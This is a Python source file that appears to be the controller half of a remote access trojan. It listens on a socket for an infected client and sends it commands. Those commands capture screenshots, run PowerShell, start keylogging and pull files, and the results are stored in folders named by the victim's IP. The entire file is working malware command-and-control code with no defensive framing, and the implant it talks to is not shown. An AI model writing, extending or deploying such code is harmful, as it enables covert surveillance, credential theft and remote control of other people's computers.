import socket
from utils import *
import datetime


SCREENSHOT = 'SCREENSHOT'
KEYLOG = 'KEYLOG'

commands = ['screenshot', 'exec', 'keylog', 'stop', 'download']

init = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
config = ('192.168.0.185', 8000)
init.bind(config)
init.listen(5)
print("Waiting for connections..")

ss, client = init.accept()
print('Connection established via', client)    
user_ip = ss.getpeername()[0]

try:
    while True:
        command = input("Enter command: ")
        if command.lower().split()[0] in commands:
            if command == '':
                print("No command entered")
                continue
            elif command == 'stop':
                print("Stopping, Goodbye !")
                break
            else:
                if command == 'screenshot':
                    print('Processing screenshot..')
                    image_dir = os.path.join(os.path.dirname(__file__), 'binaries', user_ip)
                    filename = random_name()+'.png'
                    ss.send(SCREENSHOT.encode())
                    try:
                        if not os.path.exists(image_dir):
                            os.mkdir(image_dir)

                        while True:
                            data = ss.recv(1024)

                            if data:
                                with open(os.path.join(image_dir, filename), 'ab') as file:
                                    file.write(data)
                                continue
                            print(f'saved as {filename}')
                            break

                    except KeyboardInterrupt:
                        continue
                    

                elif command.startswith("exec"):
                    print('Executing powershell script..')
                    ss.send(command.encode())

                    client_dir = os.path.join(os.path.dirname(__file__), 'powershell_data', user_ip)
                    filename = str(datetime.datetime.now())[0:19] + '.txt'

                    try:

                        if not os.path.exists(client_dir):
                                os.mkdir(client_dir)

                        while True:
                            data = ss.recv(1024).decode('cp866')
                            if data:
                                with open(os.path.join(client_dir, filename), 'a') as file:
                                    file.write(data)
                                continue
                            print(f'saved as {filename}')
                            break  


                    except KeyboardInterrupt:
                        continue

                elif command.startswith("keylog"):
                    print('Preparing keylogger. It will be sent after file has specified length of chars')
                    ss.send(command.encode())

                    filename = str(datetime.datetime.now())[0:19] + '.txt'
                    log_dir = os.path.join(os.path.dirname(__file__), 'keylog_data', user_ip)
                
                    try:

                        if not os.path.exists(log_dir):
                                os.mkdir(log_dir)

                        while True:
                            data = ss.recv(1024).decode('cp866')
                            if data:
                                with open(os.path.join(log_dir, filename), 'a') as file:
                                    file.write(data)
                                continue
                            print(f'saved as {filename}')
                            break
                            
                        
                    except KeyboardInterrupt:
                        continue

                elif command.startswith('download'):
                    print(f"Downloading file {command[8:]}")
                    ss.send(command.encode())

                    filename = str(datetime.datetime.now())[0:19] + '.txt'
                    download_dir = os.path.join(os.path.dirname(__file__), 'download_data')

                    try:
                        if not os.path.exists(download_dir):
                            os.mkdir(download_dir)
                        
                        while True:
                            data = ss.recv(1024).decode('cp866')
                            if data:
                                with open(os.path.join(download_dir, filename), 'a') as file:
                                    file.write(data)
                                continue
                            print(f'saved as {filename}')
                            break
                    except KeyboardInterrupt:
                        continue
        else:
            print("Unavailable command. List of commands", commands)
            continue
except Exception as e:
    print('error', e)
    quit()
